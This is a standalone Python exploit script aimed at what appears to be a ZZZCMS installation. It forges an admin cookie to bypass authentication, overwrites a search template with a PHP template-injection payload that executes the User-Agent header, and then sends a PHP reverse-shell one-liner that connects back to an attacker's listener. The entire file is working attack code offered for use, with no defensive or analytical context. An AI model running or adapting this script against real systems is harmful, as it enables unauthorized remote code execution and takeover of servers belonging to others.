import sys
import requests


# only for debugging
proxies = {
  "http": "http://127.0.0.1:8080"
}

def main(rhost, lhost, lport):
    # file overwrite + auth bypass exploit:
    target_text = "{if:passthru($_SERVER[HTTP_USER_AGENT])}exploit-test{end if}"
    target_file = "/template/pc/cn2016/html/search.html"
    
    headers = {
            "User-Agent":"random_agent",
            "Content-Type":"application/x-www-form-urlencoded"
            }

    cookies = {
            "zzz_adminid":"1"
            }

    payload = {
            "file": f"{target_file}",
            "filetext": f"{target_text}"
            }

    if not rhost.startswith("http") and not rhost.startswith("https"):
        print("(-) set the correct schema to the rhost")
        sys.exit(0)

    endpoint = rhost + "/admin871/save.php?act=editfile"
    
    try:
        print("(+) sending the file overwrite exploit")
        res = requests.post(endpoint, cookies=cookies, headers=headers, data=payload, verify=False, timeout=20)
        if res.status_code == 200:
            print("(+) file has been overwritten ( uncertain )")
            print("(+) double checking ...")
            endpoint = rhost + "/search/"
            headers = {
            "User-Agent": "id"
            }
            try:
                res = requests.get(endpoint, headers=headers, verify=False, timeout=20)
                response_text = res.text.strip()
                if "uid" in response_text:
                    print(f"(+) file overwitten ( confirmed ): {response_text}")
                else:
                    print("(-) couldn't confirm, moving on ...")
            except Exception as err:
                print("(+) confirmation went wrong: ", err)
        else:
            print("(-) file has not been overwritten")
            sys.exit(0)
    except Exception as err:
        print("(-) exploit crashed at file overwite: ", err)
        sys.exit(0)


    # loading the search template for a code execution
    if not isinstance(lhost, str):
        lhost = str(lhost)
    exploit_payload = f"php -r '$sock=fsockopen(\"{lhost}\",{lport});system(\"/bin/sh -i <&3 >&3 2>&3\");'"
    search_endpoint = rhost + "/search/"
    user_agent_exploit = {
            "User-Agent": f"{exploit_payload}"
    }
    try:
        print("(+) attempting code execution")
        print(f"(+) check your listener at {lhost}:{lport}")
        res = requests.get(search_endpoint, headers=user_agent_exploit, verify=False, timeout=20)
    except requests.Timeout:
        print("(+) done ...")
    except Exception as err:
        print("(+) exploit crashed at code exec: ", err)
        sys.exit(0)



def usage():
    print("(-) exploit requires 4 args: ")
    print("(+) => python3 exploit-zzz.py <rhost> <lhost> <lport>")

try:
    script, rhost, lhost, lport = sys.argv
except Exception as err:
    usage()
    sys.exit(0)

main(rhost, lhost, lport)
